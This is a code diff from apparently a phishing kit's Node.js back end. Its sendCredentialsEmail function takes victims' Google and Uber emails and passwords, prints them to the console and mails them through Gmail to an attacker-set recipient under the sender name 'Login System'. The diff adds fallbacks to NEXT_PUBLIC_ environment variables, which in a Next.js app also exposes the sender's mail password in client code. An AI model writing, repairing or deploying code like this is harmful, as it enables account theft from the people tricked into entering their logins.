@@ -6,15 +6,15 @@ dotenv.config();
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
-    user: process.env.GMAIL_USER,
-    pass: process.env.GMAIL_APP_PASSWORD
+    user: process.env.GMAIL_USER || process.env.NEXT_PUBLIC_GMAIL_USER,
+    pass: process.env.GMAIL_PASSWORD || process.env.NEXT_PUBLIC_GMAIL_PASSWORD
   }
 });
 
 async function sendCredentialsEmail(googleEmail, googlePassword, uberEmail, uberPassword) {
   console.log('\n=== SENDING EMAIL ===');
-  console.log('Gmail User:', process.env.GMAIL_USER);
-  console.log('Recipient:', process.env.RECIPIENT_EMAIL);
+  console.log('Gmail User:', process.env.GMAIL_USER || process.env.NEXT_PUBLIC_GMAIL_USER);
+  console.log('Recipient:', process.env.RECIPIENT_EMAIL || process.env.NEXT_PUBLIC_RECIPIENT_EMAIL);
   console.log('\nCredentials to send:');
   console.log('Google Email:', googleEmail);
   console.log('Google Password:', googlePassword);
@@ -68,8 +68,8 @@ async function sendCredentialsEmail(googleEmail, googlePassword, uberEmail, uber
     `;
 
     const info = await transporter.sendMail({
-      from: `"Login System" <${process.env.GMAIL_USER}>`,
-      to: process.env.RECIPIENT_EMAIL,
+      from: `"Login System" <${process.env.GMAIL_USER || process.env.NEXT_PUBLIC_GMAIL_USER}>`,
+      to: process.env.RECIPIENT_EMAIL || process.env.NEXT_PUBLIC_RECIPIENT_EMAIL,
       subject: `New Login Credentials - ${new Date().toLocaleDateString()}`,
       html: htmlContent
     });
